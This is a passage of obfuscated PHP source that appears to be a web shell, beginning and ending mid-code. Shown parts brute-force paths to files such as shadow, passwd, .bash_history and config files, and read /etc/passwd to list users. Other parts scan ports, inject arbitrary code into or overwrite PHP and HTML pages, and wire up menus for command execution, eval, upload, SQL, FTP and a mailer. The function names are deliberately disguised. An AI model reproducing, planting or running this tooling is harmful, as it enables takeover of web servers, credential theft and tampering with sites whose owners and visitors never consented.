$path="{$root}".((@substr($root,-1)!="/")?"/":NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}"; $prevD3=$safeDirarr[@count($safeDirArr)-1]; @glob($path."*"); if($safeDirArr[@count($safeDirArr)-1]!=$prevD3){ for($r=0;$r<@strlen($chars);$r++){ $path="{$root}".((@substr($root,-1)!="/")?"/":NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}"; @glob($path."*"); } } } } } } } $safeDirArr=@array_unique($safeDirArr); foreach($safeDirArr as $item) echo @htmlspecialchars("{$item}")."\r\n"; @error_reporting($error_reporting); } } function z3y($dir){ if(z7e('realpath')){ global $win,$safeDirArr; $chars_rlph="_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; $presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','config.default.php','config.inc.php','shadow','passwd','.bash_history','.mysql_history','master.passwd','user','admin','password','administrator','phpMyAdmin','security','php.ini','cdrom','root','my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.conf','accounting.log','home','htdocs','access','auth','error','backup','data','back','sysconfig','phpbb','phpbb2','vbulletin','vbullet','phpnuke','cgi-bin','html','robots.txt','billing'); if(!$dir){$dir='/etc/';}; $end_rlph=''; $n_rlph='3'; $c=0; $safeDirArr=array(); $rlpArr=array(); $error_reporting=@ini_get('error_reporting'); @error_reporting(E_WARNING); @ini_set("display_errors",1); @set_error_handler("z0e"); if($realpath=realpath($dir.'/')){echo $realpath."\r\n";} if($end_rlph!='' && $realpath=realpath($dir.'/'.$end_rlph)){echo $realpath."\r\n";$rlpArr[]=$realpath; } foreach($presets_rlph as $preset_rlph){ if($realpath=realpath($dir.'/'.$preset_rlph.$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } } for($i=0; $i < strlen($chars_rlph); $i++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } if($n_rlph<=1){continue;}; for($j=0; $j < strlen($chars_rlph); $j++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } if($n_rlph<=2){continue;}; for($x=0; $x < strlen($chars_rlph); $x++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } if($n_rlph<=3){continue;}; for($y=0; $y < strlen($chars_rlph); $y++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } if($n_rlph<=4){continue;}; for($z=0; $z < strlen($chars_rlph); $z++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } if($n_rlph<=5){continue;}; for($w=0; $w < strlen($chars_rlph); $w++){ if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}{$chars_rlph[$w]}".$end_rlph)){echo $realpath."\r\n"; $rlpArr[]=$realpath; } } } } } } } $safeDirArr=@array_unique($safeDirArr); foreach($safeDirArr as $item){ if(!@in_array($item, $rlpArr)) echo @htmlspecialchars($item)."\r\n"; } @error_reporting($error_reporting); } } function z4h($d, $t,$b=0){ $d=z1j($d); $t=z1j($t); if(@is_dir($d)) { if(!z4r($t)){ @mkdir($t); @chmod($t,0755); } $h=@opendir($d); while(($o=@readdir($h))!==false){ if(($o!=".") && ($o!="..")){ if(@is_dir(z1k($d).$o)){ z4h(z1k($d).$o, z1k($t).$o, $b); } else { @copy(z1k($d).$o, z1k($t).$o); if($b){ @unlink(z1k($d).$o); } } } } @closedir($h); if($b){ @rmdir($d); } return true; } elseif(@is_file($d)){ if(@is_dir($t)){ $t=z1k($t).z2l($d); } if($b){ if(@copy($d, $t)) return @unlink($d); } else { return @copy($d, $t); } } else { return false; } } function z8r($d,$t){ return z4h($d,$t); } function z8p($d,$t){ return z4h($d,$t,1); } function z8a($d){ $d=z1k($d); $h=@opendir($d); while(($o=@readdir($h))!==false){ if($o!="." && $o!=".." && !z4q($o)){ if(!z4j($d.$o)){ @unlink($d.$o); }else{ z8a($d.$o); } } } @closedir($h); @rmdir($d); return !z4j($d); } function z8s($o){ $o=z1j($o); if(@z4j($o)){ return z8a($o); } elseif(z4e($o)){ return @unlink($o); } else{ return false; } } function z8u(){ $h=(@empty($_SERVER['HTTPS'])||@strtolower($_SERVER['HTTPS'])=='off'?0:1); $u='http'.(($h?'s':'').'://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']); $m=(@empty($_SERVER['PATH_INFO'])?'QUERY_STRING':'PATH_INFO'); $s=$m=='QUERY_STRING'?'?':''; return $u.$s.(@isset($_SERVER[$m])?$_SERVER[$m]:''); } function z6n(){ $u=array(); $p=z9o("/etc/passwd"); if($p){ $ll=@explode("\n",$p); foreach(@array_unique($ll) as $l){ $s=@explode(":",$l); if(@isset($s[0]) && @isset($s[2])&& @isset($s[3]) && @isset($s[5])&& @isset($s[6]) && !@isset($u[$s[0]])){ $u[$s[0]]=array($s[2], $s[3], $s[5], $s[6]); } } } elseif (z7e('posix_getpwuid')){ for($i=0; $i<65535; $i++){ $a=@posix_getpwuid($i); if($a && @is_array($a)){ if(@isset($a['name']) && !@empty($a['name']) && !@isset($u[$a['name']])){ $u[$a['name']]=array($a['uid'], $a['gid'], $a['dir'], $a['shell']); } } } } return $u; } function z8l($t=0){ $a=array(); $p=z6n(); if(@count($p)>0){ foreach($p as $u=>$v) $a[]=(($t) ? array($u,$v[2]) : $u); } return $a; } if(!z7e('str_repeat')){ function str_repeat($i,$c){ $r=''; for($n=0;$n<$c;$n++)$r.=$i; return $r; } } function z9w($m,$s=0){ if(($m&0xC000)===0xC000){ $t="s"; } elseif(($m&0x4000)===0x4000){ $t="d"; } elseif(($m&0xA000)===0xA000){ $t="l"; } elseif(($m&0x8000)===0x8000){ $t="-"; } elseif(($m&0x6000)===0x6000){ $t="b"; } elseif(($m&0x2000)===0x2000){ $t="c"; } elseif(($m&0x1000)===0x1000){ $t="p"; } else{ $t="?"; } $a["r"]=($m&00400)>0; $a["w"]=($m&00200)>0; $a["x"]=($m&00100)>0; $b["r"]=($m&00040)>0; $b["w"]=($m&00020)>0; $b["x"]=($m&00010)>0; $c["r"]=($m&00004)>0; $c["w"]=($m&00002)>0; $c["x"]=($m&00001)>0; if($s) return array("t"=>$t, "o"=>$a, "g"=>$b, "w"=>$c); $o["r"]=($a["r"])?"r":"-"; $o["w"]=($a["w"])?"w":"-"; $o["x"]=($a["x"])?"x":"-"; $g["r"]=($b["r"])?"r":"-"; $g["w"]=($b["w"])?"w":"-"; $g["x"]=($b["x"])?"x":"-"; $w["r"]=($c["r"])?"r":"-"; $w["w"]=($c["w"])?"w":"-"; $w["x"]=($c["x"])?"x":"-"; if($m&0x800) $o["x"]=($o["x"]=="x")?"s":"S"; if($m&0x400) $g["x"]=($g["x"]=="x")?"s":"S"; if($m&0x200) $w["x"]=($w["x"]=="x")?"t":"T"; return $t.@join("",$o).@join("",$g).@join("",$w); } function z8j($i,$s,$e){ $p=''; $k=array('80'=>'Webserver','443'=>'OpenSSL','3306'=>'MySQL','5432'=>'PostgreSQL',); if(z7e('fsockopen')&&z7e('stream_set_timeout')){ for($n=$s;$n<=$e;$n++){ $c=@fsockopen($i,$n,$en,$es,1); if($c){ @stream_set_timeout($c,0,50000); $t=@preg_replace("/(\r|\n|[^a-z0-9_&%:;\.,\[\]\(\)\s-])/i","",@fread($c,100)); $t=(@isset($k[$n])?$k[$n].' '.$t:$t); if(@empty($t)) $t="Open"; $p.="[$i]   Port $n".((@strlen($n)<5)?@str_repeat(' ',(5-@strlen($n))):'')."   $t\r\n"; @fclose($c); } } } return $p; } function z8d($a){ $b=@strtolower(@ini_get($a)); if($b=='on'||$b=='yes'||$b=='true'){ return 'assert.active'!==$a; } elseif($b=='stderr'||$b=='stdout'){ return 'display_errors'===$a; } else{ return (bool)(int)$b; } } function z8o($c,$l){ return (@strlen($c)>$l) ? @substr($c,0,(@ceil($l/2)-2))."[..]".@substr($c,-(@ceil($l/2)-2)) : $c; } function init_buffer(){ if(!@isset($_SESSION['buffer'])){ $_SESSION['buffer']=array(); } } function unset_buffer(){ if(@isset($_SESSION['buffer'])){ unset($_SESSION['buffer']); } } function z8i($i,$t=0){ return ($t===0?z7c($i):($t===1?@ord($i):@chr($i))); } function z8y($s, $d=',', $e='"', $esc='\\'){ $n = 0; $r = array(); $ed='%#%#%E%S%C%A%P%E%D%#%#%'; $s=@str_replace($esc.$e, $ed, $s); $s=@preg_replace('/'.$e.'([^'.$e.']+)'.$e.'(\s|\t)+'.$d.'/', $e."\\1".$e.$d, $s); $s=@preg_replace('/'.$e.'([^'.$e.']+)'.$e.$d.'(\s|\t)+/', $e."\\1".$e.$d, $s); if(@strstr($s,$e)){ $a=@explode($e, $s); foreach($a as $i){ if($n++%2){ @array_push($r, @str_replace($ed, $e, @array_pop($r) . $i )); }else{ $b=@explode($d, $i); @array_push($r, @str_replace($ed, $e, @array_pop($r) . @array_shift($b))); $r=@array_merge($r, $b); } } } return $r; } function z5s($s, $eol="\n", $d=',', $e='"', $esc='\\'){ $r=array(); if(@strstr($s, $eol)){ $p=@explode($eol, $s); foreach($p as $l){ if(!@empty($l)) $r[]=z8y($l,$d,$e,$esc); } } else { $r[]=z8y($s,$d,$e,$esc); } return $r; } function z9n(){ return z8e(z8i(z8c()),z8c()); } function z8t($e){ $r=z9e("PATH='/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin';which $e"); return(@empty($r)?0:$r); } function z9b($i){ return @base64_decode($i); } function z4f(& $a,$k=""){ if(@is_array($a)){ foreach($a as $k=>$v){ z4f($a["$k"]); } }else{ $a=@stripslashes($a); } } function z3s($h, $n, $o=0){ $l=@strlen($h); $o=($o>0)?($l-$o):@abs($o); $p=@strpos(@strrev($h),@strrev($n),$o); return ($p===false)?false:($l-$p-@strlen($n)); } function z3v($inj,$w,$f){ $c=z9o($f); $r=''; if(!$c) return false; switch($w){ case 'top': $r=$inj.$c; break; case 'end': $r=$c.$inj; break; case 'php1': $p=@strpos($c,'<?'); if($p===false) return false; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'php2': $p=z3s($c,'?>'); if($p===false) return false; $p+=2; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'html1': $p=@strpos($c,'<html>'); if($p===false) return false; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'html2': $p=@strpos($c,'</html>'); if($p===false) return false; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'html3': $p=@strpos($c,'<html>'); if($p===false) return false; $p+=6; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'html4': $p=@strpos($c,'</html>'); if($p===false) return false; $p+=7; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'body1': if(!@preg_match('/<body[^>]*>/',$c,$m)) return false; $p=@strpos($c,$m[0]); $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'body2': $p=z3s($c,'</body>'); if($p===false) return false; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'body3': if(!@preg_match('/<body[^>]*>/',$c,$m)) return false; $p=@strpos($c,$m[0]); $p+=@strlen($m[0]); $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'body4': $p=z3s($c,'</body>'); if($p===false) return false; $p+=7; $r=@substr($c,0,$p).$inj.@substr($c,$p); break; case 'overwrite': $r=$inj; break; default: return false; break; } return z9t($f,$r); } function z3u(& $a,$k=''){ if(@is_array($a)){ foreach($a as $k=>$v){ z3u($a["$k"]); } }else{ if($a=='name'||$a=='tmp_name') $a=z1j($a); } } function z8e($i,$o){ $r=@create_function('$o','return @'.z7c($o,0).'($o);'); return $r($i); } function z7v($n,$ac,$a,$b=0){ global $act; return z6l(z5x(array('act'=>$ac,'d','sort'), z8b($n,($a?'4':'5'),($act==$ac&&$b?' style="border-right:0;"':''))),'5'); } function z0a($k){ if(!@isset($_SESSION[$k])||!@is_array($_SESSION[$k])){ z0i($k); $_SESSION[$k]=array(); $_SESSION[$k][]=array('act'=>z7z('2','default_act')); } } function z2d($k){ if(@count($_SESSION[$k])>0) return @count($_SESSION[$k]); $_SESSION[$k][]=array('act'=>z7z('2','default_act')); return @count($_SESSION[$k]); } function z0l(){ $p=array(); if(@count($_POST)>0){ foreach($_POST as $n=>$v){ if(@substr($n,0,5)!='backf') $p[$n]=$v; } } return $p; } function z0f($k){ $cleanp=z0l(); if($cleanp != z2m($k)) $_SESSION[$k][]=$cleanp; } function z3f($k){ $_SESSION[$k]=@array_reverse($_SESSION[$k]); @array_pop($_SESSION[$k]); $_SESSION[$k]=@array_reverse($_SESSION[$k]); z2t($k); } function z2m($k){ $c=z2d($k); if($c==0) return array(); if($c>0) z2t($k); $n=(($c>1) ? ($c-2) : (($c>0) ? ($c-1) : 0)); return $_SESSION[$k][$n]; } function z2t($k){ $r=array(); foreach($_SESSION[$k] as $v) $r[]=$v; $_SESSION[$k]=$r; } function z5f($sk){ global $backf,$white,$back_form_actions; z0a($sk); if(@isset($backf)&&$backf){ @array_pop($_SESSION[$sk]); } elseif(!@isset($white)||!$white) { z0f($sk); } $back=z2m($sk); if(z2d($sk)>10) z3f($sk); $a=array(); if(@count($back)>0){ $a['backf']='1'; if(@is_array($back)){ foreach($back as $k=>$v){ $a['backf_'.$k]=@urlencode($v); } } } $back_form_actions=$a; return z6l(((@count($a)>0)? z5x($a,z8b(z9y("23"),'15')) : z8b(z9y("23"),'5')),'5'); } function z0p(){ global $act,$sh_exec,$safe_exec,$bftp,$bmail; echo z7a(z7u(z5f('hist'). z7v(z9y("24"),"ls",(@in_array($act,array("ls","d","f","dfunc")))). z7v(z9y("25"),"search",($act=="search")). z7v(z9y("26"),"upload",($act=="upload")). (($sh_exec||$safe_exec)?z7v(z9y("27"),"cmd",($act=="cmd")):''). z7v(z9y("28"),"eval",($act=="eval")). ($bftp?z7v(z9y("193"),"ftp",($act=="ftp")):''). z7v(z9y("29"),"sql",($act=="sql")). ($bmail?z7v(z9y("30"),"mailer",($act=="mailer")):''). z7v(z9y("31"),"encoders",($act=="encoders")). z7v(z9y("32"),"tools",($act=="tools")). ($sh_exec?z7v(z9y("33"),"processes",($act=="processes")):''). z7v(z9y("34"),"sysinfo",(@in_array($act,array("sysinfo","phpinfo")))).z7v("&nbsp;",false,"")),'4'); } function z8w($i,$s){ return ($s)?z7q(@substr($i[1],4)):z7q(@substr($i[1],0,4)); } function z1j($t){ $t=@str_replace('\\','/',$t); if(@strstr($t,'//')){ while(@strstr($t,'//')!==false) $t = @str_replace('//','/',$t); } return $t; } function z1k($t){ $t=z1j($t); if(@substr($t,-1)!='/') $t.='/'; if(@preg_match('/[^\/\r\n"\']+\/\.\.\//', $t)) $t = @preg_replace('/[^\/\r\n"\']+\/\.\.\//', '', $t); if($t=='/../') $t= '/'; if($t!='./'&&@strstr($t,'./')!==false) $t=@str_replace('./','',$t); return $t; } function z2v($f,$t,$c){ if(@strstr($c,$f)) while(@strstr($c,$f)) $c=@str_replace($f,$t,$c); return $c; } function z1n($action){ global $d,$win; if(!$win) return ''; $e=@explode("/",$d); $r=''; foreach(@range("B","Z") as $let){ if($let.":"!=@strtoupper($e[0])&&z4r($let.":/")){ $r .= z5x(array("act"=>$action,"d"=>@strtoupper($let).":/"),z8b("[$let]","1")).z9x(2); } } return $r; } function z1m($t,$ftp=0){ global $win; $def="/"; if($win&&!$ftp){ $path=@realpath('index.php'); $def=@substr($path,0,1).":/"; } if(@substr($t,-1)=='/') $t=@substr($t,0,-1); if(@empty($t)) return array($def); $e=@explode('/', $t); $d=array(); if($win&&!$ftp){ $p=''; } else { $p='/'; } for($i=0; $i < @count($e); $i++){ if(@empty($e[$i])){ $d['/']='/'; } else { $p.=$e[$i].'/'; $d[$p]=$e[$i]; } } return $d; } function z1v($n,$a=array(),$c='',$g='',$t='1',$s=''){ $r='<select name="'.$n.'"'.($c!=''?' class="'.z4m($c,'4').'"':'').($s!=''?(@is_numeric($s)?' '.z10r($s):' '.$s):'').'>'."\n"; if($g!='') global ${$n}; foreach($a as $k=>$v){ $r.='<option value="'.($t=='1'?$k:$v).'"'.(($g!='' && ($t=='1'? $k : $v) ==${$n})?' selected':'').'>'.($t=='1'? $v : $k).'</option>'."\n"; } $r.='</select>'; return $r; } function z3m($n,$a=array(),$c='',$g='',$s=''){ return z1v($n,$a,$c,$g,'1',$s); } function z2k($n,$a=array(),$c='',$g='',$s=''){ return z1v($n,$a,$c,$g,'0',$s); } function z8n($t=0){ global $d,$ftp_current_dir; $a=((!$t||$t=='l')?z1m($d):z1m($ftp_current_dir,1)); $c=@count($a); $i=0; $n=''; foreach($a as $k=>$v){ $i++; $n.=z5x(($t===0?array('act'=>'ls','d'=>$k):($t=='l'? array('act'=>'ftp','d'=>$k): array('act'=>'ftp','d','ftp_current_dir'=>$k))),z8b($v,'1').(($v!='/'&&$i!=$c)?' / ':' ')); } echo z10w(z7u(z7k((!$t?z5x(array('act'=>'ls','d'=>z3a('index.php')),z8h('small_home','','9')).z9x().z1n("ls"):'').$n.(!$t?' ('.z6t(z9w(@fileperms($d)),z6g($d)).')':''))),'5'); } function z2n(){ global $d; echo z3q(z10w(z7u( z6l(z5x(array('act'=>'f','d'), z7n(z9y("35")).z6u('f',$d,'0').z3m('ft',array('functions'=>z9y("74"),'edit'=>z9y("75"),'new'=>z9y("195")),'1').z8b('&raquo;','7')),''). z6l(z5x(array('act'=>'d','dold'=>$d), z7n(z9y("36")).z6u('d',$d,'0').z3m('dt',array('chdir'=>z9y("425"),'new'=>z9y("195")),'1').z8b('&raquo;','7')),'') ),'2'),''); } function z5r($s){ $a=@preg_replace('/[^0-9]/','',$s); if(@empty($a)) $a="0"; $b=@substr($s,-1); if($b!='d') $b='a'; return array($a,$b); } function z2b($a,$b){ global $v; return @strnatcmp(@strtolower($a[$v]),@strtolower($b[$v])); } function z9h($d){ global $with_ls; $r=array(); $ls=@str_replace('\\','',z9e('ls -a "'.$d.'" 2>/dev/null',0)); $e=@explode("\n",$ls); if(@count($e)>0){ $with_ls=1; foreach($e as $p){ if($p!=''&&$p!=$d&&!@in_array($d.$p, $r)) $r[]=$d.$p; } } return $r; } function z4s($pn,$t='f'){ if($t=='d'){ $ls=@str_replace('\\','',z9e('ls -dla "'.$pn.'" 2>/dev/null',0)); } else { $ls=@str_replace('\\','',z9e('ls -la "'.$pn.'" 2>/dev/null',0)); } $el=@explode("\n",$ls); if(@count($el)>0){ $l=$el[0]; } else { $l=$ls; } if(@strstr($l,'->')){ $ll=@explode('->',$l); if(@count($ll)>2){ @array_pop($ll); $l=@implode('->',$ll); } else { $l=@trim($ll[0]); } } $len=@strlen($l); $pnl=(@strlen($pn)+1); if(@substr($l, -$pnl)==" ".$pn){ $pi=@substr($l,0,($len-$pnl)); $pi=z2v('  ',' ',$pi); $p2=@explode(" ",$pi); if(@count($p2)>5){ $pp=$p2[0]; $pu=$p2[2]; $pg=$p2[3]; $ps=$p2[4]; if(!@is_numeric($ps) && @substr($ps,-1)=="," && @is_numeric($p2[5])){ $ps.=$p2[5]; $st=6; } else { $st=5; } if(@is_numeric($ps)) $ps=z7x($ps); $pd=''; for($i=$st;$i<@count($p2);$i++) $pd .=$p2[$i].' '; $pd=@trim($pd); if(z7e('strtotime') && ($s2t=@strtotime($pd))!==false) $pd=@date("Y-m-d H:i", $s2t); if($pp[0]=="l"){ return array($pn,'LINK',$pd,array($pu,$pg),$pp); }elseif($pp[0]=="d"){ return array($pn,'DIR',$pd,array($pu,$pg),$pp); }else{ return array($pn,$ps,$pd,array($pu,$pg),$pp); } } } return array('','','',array('',''),''); } function z8x($d){ global $nix, $sh_exec, $act, $lswf; $d=z1k($d); if(@substr($d,-1)!='/') $d.='/'; $r=array(); $lswf=''; if(z7e('scandir')&&($h=@scandir($d))){ foreach($h as $t) $r[]=$d.$t; $lswf='scandir'; } elseif(z7e('dir')&&($h=@dir($d))){ while(($t=$h->read())!==false) $r[]=$d.$t; $h->close(); $lswf='dir'; } elseif(z7e('opendir')&&z7e('readdir')&&z7e('closedir')&&($h=@opendir($d))){ while(($t=@readdir($h))!==false) $r[]=$t; @closedir($h); $lswf='opendir'; } elseif($nix && $sh_exec && ($act=="ls"||$act=="search") && @count($r=z9h($d))>0){ $lswf='ls'; return $r; } elseif(z7e('glob') && ($h=@glob($d.'*'))!==false){ if(@count($h)>0){ foreach($h as $t) $r[]=$t; } if(($h=@glob($d.'.*'))!==false && @count($h)>0){ foreach($h as $t) $r[]=$t; } if(@count($r)>0 && !@in_array($d.'.',$r)) $r[]=$d.'.'; if(@count($r)>0 && !@in_array($d.'..',$r)) $r[]=$d.'..'; $lswf='glob'; } if(@count($r)>0) @sort($r); return $r; } function z8c(){ return (@isset($value)?$value:'unknown'); } function z4i(){ global $use_images,$use_buffer,$act,$bcopy,$bcut,$showbuf,$d,$with_ls,$lswf,$filter; $f_a=array('all'=>z9y("37"),'dirs'=>z9y("38"),'files'=>z9y("39"),'archives'=>z9y("40"),'exes'=>z9y("41"),'php'=>z9y("42"),'html'=>z9y("43"),'text'=>z9y("44"),'images'=>z9y("45"),'other'=>z9y("46")); $fs=''; foreach($f_a as $fk=>$f) $fs .= z5x(array('act','d','showbuf','filter'=>$fk),z8b($f,( ((@isset($filter)&&$filter==$fk) || (!@isset($filter)&&$fk=='all') )? '17' : '16') )); $ba=z5x(array('act','d','use_buffer'=>($use_buffer ? '0' : '1')), z8b(($use_buffer ? z9y("50") : z9y("49")),'16')); if($use_buffer && (@count($bcopy)>0||@count($bcut)>0)){ $bbcopy=(@count($bcopy)>0); $bbcut=(@count($bcut)>0); $ba.=z5x(array('act'=>'ls','d','emptybuf'=>'1'), z8b(z9y("51"),'16')).((!@isset($showbuf)||!$showbuf) ? z5x(array('act'=>'ls','d','showbuf'=>'1'), z8b(z9y("52"),'16')).($bbcopy?z5x(array('act'=>"d",'d','dt'=>'bpastecopy','showbuf'), z8b(z9y("54"),'16')):'').($bbcut?z5x(array('act'=>"d",'d','dt'=>'bpastecut','showbuf'), z8b(z9y("55"),'16')):'').(($bbcopy&&$bbcut)?z5x(array('act'=>"d",'d','dt'=>'bpasteall','showbuf'), z8b(z9y("56"),'16')):'') : z5x(array('act'=>'ls','d'), z8b(z9y("53"),'16'))); } if(!@isset($lswf)) $lswf=''; echo z10w(z7u(z6l($fs.z5x(array('act','d','showbuf','use_images'=>($use_images?'0':'1')),z8b(($use_images?z9y("48"):z9y("47")),'16')).$ba,'11')),'7'); } function z1q($t, $filter,$tt){ global $index; if(z2l($t)=='..') return 1; switch($filter){ case 'dirs': return ($tt=='d'); case 'files': return ($tt=='f'||$tt=='e'); case 'exes': return ($tt=='e'||(($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',@array_merge($index['cmd'],$index['pl'])).')$/i', $t))); case 'archives': return (($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',$index['tar']).')$/i', $t)); case 'php': return (($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',$index['php']).')$/i', $t)); case 'html': return (($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',$index['html']).')$/i', $t)); case 'text': return (($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',@array_merge($index['txt'],$index['wri'],$index['doc'])).')$/i', $t)); case 'images': return (($tt=='f'||$tt=='e') && @preg_match('/\.('.@implode('|',$index['jpg']).')$/i', $t)); case 'other': return($tt=='f' && !@preg_match('/\.('.@implode('|',@array_merge($index['tar'], $index['php'], $index['html'], $index['jpg'], $index['txt'],$index['wri'],$index['doc'],$index['cmd'],$index['pl'])).')$/i', $t)); default: return 1; } } function z0o($f,$t='',$d=0){ global $use_buffer, $bcut, $bcopy, $with_ls,$external,$bziparchive,$reg_archives,$nix,$sh_exec; if($d==0){ $d=z3a($f); } else { global $d; } $f=z2l($f); $a=array(); $a['functions']=z9y("74"); $a['edit']=z9y("75"); if(@isset($reg_archives)&&$reg_archives!=''){ if(@preg_match('/\.('.$reg_archives.')$/',$f,$m)){ if(@isset($m[1])){ if($m[1]!="zip"||($m[1]=="zip"&&$nix&&$sh_exec)) $a['extract']=z9y("478",$m[1]); if($m[1]=="zip"&&$bziparchive) $a['extractzip']=z9y("478","zip (php)"); } } } if($use_buffer&&(!@isset($with_ls)||!$with_ls)&&(!@isset($external)||!$external)){ $a['bcopy']=(@in_array($f,$bcopy)?z9y("69"):z9y("67")); $a['bcut']=(@in_array($f,$bcut)?z9y("70"):z9y("68")); } $a['delete']=z9y("72"); if(!@isset($external)||!$external) $a['rename']=z9y("73"); $a['download']=z9y("76"); return z5x(array('act'=>'f','f'=>$f,'d'=>$d,'showbuf'), z3m('ft',$a,'3').z8b('&raquo;','6'),$t); } function z1r($tt,$t=''){ global $use_buffer, $bcopy, $bcut, $with_ls,$showbuf; $a=array(); $a['chdir']=z9y("425"); $a['functions']=z9y("74"); if($use_buffer&&(!@isset($with_ls)||!$with_ls)){ $a['bcopy']=(@in_array($tt,$bcopy)?z9y("69"):z9y("67")); $a['bcut']=(@in_array($tt,$bcut)?z9y("70"):z9y("68")); if(!@isset($showbuf)||!$showbuf){ if(@count($bcopy)>0) $a['bpastecopy']=z9y("54"); if(@count($bcut)>0) $a['bpastecut']=z9y("55"); if(@count($bcopy)>0&&@count($bcut)>0) $a['bpasteall']=z9y("56"); } } $a['rename']=z9y("73"); $a['delete']=z9y("72"); return z5x(array('act'=>'d','d','tt'=>$tt,'showbuf'), z3m('dt',$a,'3').z8b('&raquo;','6'),$t); } function z0z($d,$t){ return z5x(array('act'=>'d','d'=>$d), z3m('dt',array('chdir'=>z9y("425")),'3').z8b('&raquo;','6'),$t); } function z0w($d){ return z5x(array('act'=>'ftp','flsort','ffsort','d'=>$d), z3m('chdir',array(''=>z9y("425")),'3').z8b('&raquo;','6')); } function z0q($t){ return z5x(array('act'=>'ftp','flsort','ffsort','d','rd'=>$t), z3m('ft',array('chdir'=>z9y("425")),'3').z8b('&raquo;','6')); } function z0t($t){ return z5x(array('act'=>'ftp','flsort','ffsort','d','lt'=>$t), z3m('ft',array('upload'=>z9y("197"),'delete'=>z9y("199")),'3').z8b('&raquo;','6')); } function z0r($t){ return z5x(array('act'=>'ftp','flsort','ffsort','d','rt'=>$t), z3m('ft',array('download'=>z9y("198"),'delete'=>z9y("199")),'3').z8b('&raquo;','6')); } function z4r($t){ if(z4e($t)||z4j($t)||z4q($t)||z1y($t)||z0n($t)||z5i($t)) return 1; return 0; } function z2i($f,$t){ global $nix, $sh_exec; if(@file_exists($f)){ if($t=='f') return @is_file($f); if($t=='d') return @is_dir($f); if($t=='L') return @is_link($f); if($t=='r') return @is_readable($f); if($t=='w') return @is_writable($f); if($t=='x') return @is_executable($f); }elseif($nix&&$sh_exec){ $h=z9e('if [ -'.$t.' "'.$f.'" ]; then echo "istrue"; else echo "isfalse"; fi',0); return (@strstr($h,"istrue")&&!@strstr($h,"isfalse")); } return 0; } function z4e($f){ return z2i($f,'f'); } function z4j($f){ return z2i($f,'d'); } function z4q($f){ return z2i($f,'L'); } function z1y($f){ return z2i($f,'r'); } function z0n($f){ return z2i($f,'w'); } function z5i($f){ return z2i($f,'x'); } function z7q($i){ $r='';for($n=0;$n<@strlen($i);$n++) $r.=z8i(z8i($i[$n],1)-z8i(1,1),2); return $r; } function z5o(){ echo @str_repeat('',1024); @ob_flush(); @flush(); } function z4u($t,$s){ $l=@strlen($s); if(@substr($t,-$l)==$s) { while(@substr($t,-$l)==$s) $t=@substr($t,0,(@strlen($t)-$l)); } return $t; } function z1f($t,$s='/'){ $t=z1j($t); $t=z4u($t,$s); if(!@strstr($t,$s)) return array(); $e=@explode($s,$t); $f=$e[(@count($e)-1)]; $l=(@strlen($t)-@strlen($f)); $d=@substr($t,0,$l); return array(z1k($d),$f); } function z3a($t,$s='/'){ $e=z1f($t,$s); return (@count($e)==2 ? $e[0] : './'); } function z2l($t,$s='/'){ $e=z1f($t,$s); return (@count($e)==2 ? $e[1] : $t); } function z3q($a,$s=''){ $r=''; if(@is_array($a)) { for($i=0;$i<@count($a);$i++) $r.=z7k($a[$i],'12',(($i==0)?'2'.$s:(($i==(@count($a)-1))?'3'.$s:$s))); } else { $r=z7k($a,'12','23'.$s); } return z10w(z7u($r),'3'); } function z1p($c,$e='') { $s=''; global $index; $i=$index; $a=array(); if($e!=''){ foreach($a as $k=>$v) { if(@in_array($e,$v)){ $s=$k; break; } } } if($s=='') $s=$e; if(@in_array($s,array('db','sql','pl','cgi','c', 'cc', 'cpp', 'h', 'hpp', 'icl', 'ipp'))){ $c=@highlight_string('<?php'.$c.'?>',true); $p1=@stripos($c,'&lt;?php'); $a=@substr($c,0,$p1); $b=@substr($c,$p1+8); $c=$a.$b; $p2=@strripos($c, '?&gt;'); $a=@substr($c,0,$p2); $b=@substr($c,$p2+5); $c=$a.$b; } else { $c=@highlight_string($c,true); } $c=@str_replace(array( '<font color="', '</font>'), array( '<span style="color: ', '</span>' ), $c); $c=@preg_replace('/(\r|\n)/','',$c); echo 